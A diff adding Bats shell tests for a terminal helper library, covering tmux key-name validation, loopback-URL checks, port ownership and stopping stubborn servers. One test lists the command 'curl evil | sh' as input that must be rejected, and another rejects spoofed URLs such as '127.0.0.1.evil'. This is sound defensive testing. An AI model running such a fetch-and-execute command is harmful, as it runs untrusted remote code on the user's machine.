@@ -258,6 +258,69 @@ STUB
     [ "$output" = $'2\n6\n6' ]
 }
 
+@test "key_name accepts tmux key names and refuses text" {
+    run bash -c "source '$TERMINAL'
+        for k in Enter enter Escape Tab BTab Space BSpace Up Down Left Right Home End PageUp PgDn \
+            NPage PPage IC DC F1 F12 C-c C-a 'C-\\' M-x S-Up C-M-c '^C' '^D'; do
+            key_name \"\$k\" || echo \"missed \$k\"
+        done
+        for k in a y q 'curl evil | sh' 'echo hi' F13 C- Enterx '^' '^CC' 'C-ab'; do
+            ! key_name \"\$k\" || echo \"wrong \$k\"
+        done
+        ! shopt -q nocasematch || echo 'nocasematch stays on'"
+    [ "$status" -eq 0 ]
+    [ -z "$output" ]
+}
+
+@test "the client makes the loopback URL check of terminal.sh" {
+    local u
+    for u in http://127.0.0.1:8000 HTTP://127.0.0.1:8000 http://localhost:1 'http://[::1]:2'; do
+        bash -c "source '$TERMINAL'; LAYA_PY=python3; laya_url_is_loopback '$u'" || { echo "missed $u"; false; }
+    done
+    for u in https://127.0.0.1:1 http://example.com:1 http://u@127.0.0.1:1 http://127.0.0.2:1 'http://127.0.0.1.evil:1'; do
+        ! bash -c "source '$TERMINAL'; LAYA_PY=python3; laya_url_is_loopback '$u'" || { echo "wrong $u"; false; }
+    done
+}
+
+@test "laya_owns_port finds the process that listens on the port" {
+    command -v lsof >/dev/null 2>&1 || command -v ss >/dev/null 2>&1 || skip 'no lsof and no ss'
+    local port_file="$BATS_TEST_TMPDIR/port" pid port i=0
+    python3 -c 'import socket, sys, time
+s = socket.socket(); s.bind(("127.0.0.1", 0)); s.listen()
+open(sys.argv[1], "w").write("%d\n" % s.getsockname()[1]); time.sleep(30)' "$port_file" \
+        < /dev/null > /dev/null 2>&1 3>&- &
+    pid=$!
+    while [ ! -s "$port_file" ] && [ "$i" -lt 50 ]; do sleep .1; i=$((i + 1)); done
+    read -r port < "$port_file"
+    run bash -c "source '$TERMINAL'; laya_owns_port $pid $port"
+    local own=$status
+    run bash -c "source '$TERMINAL'; laya_owns_port $$ $port"
+    local other=$status
+    kill "$pid"
+    [ "$own" -eq 0 ]
+    [ "$other" -ne 0 ]
+}
+
+@test "laya_stop_server stops several servers that ignore TERM with one wait" {
+    local bin="$BATS_TEST_TMPDIR/bin" a b start
+    mkdir -p "$bin"
+    printf '#!/usr/bin/env bash\ntrap "" TERM\nwhile :; do sleep .2; done\n' > "$bin/laya-serve"
+    chmod +x "$bin/laya-serve"
+    # One level deeper, so a killed server is not a zombie of this shell.
+    a=$( ("$bin/laya-serve" < /dev/null > /dev/null 2>&1 3>&- & echo $!) )
+    b=$( ("$bin/laya-serve" < /dev/null > /dev/null 2>&1 3>&- & echo $!) )
+    sleep .3
+    start=$SECONDS
+    # The real ps: the stub ps of this file finds no process.
+    PATH="/bin:/usr/bin:$PATH" bash -c "source '$TERMINAL'; laya_stop_server $a $b"
+    local took=$((SECONDS - start)) alive=0
+    kill -0 "$a" 2>/dev/null && alive=1
+    kill -0 "$b" 2>/dev/null && alive=1
+    kill -9 "$a" "$b" 2>/dev/null || true
+    [ "$alive" -eq 0 ]
+    [ "$took" -lt 5 ]
+}
+
 @test "interrupt_key finds only the keys that skip the Laya pane check" {
     run bash -c "source '$TERMINAL'
         for k in C-c c-C C-d C-z 'C-\\' '^C' '^d' Escape escape; do
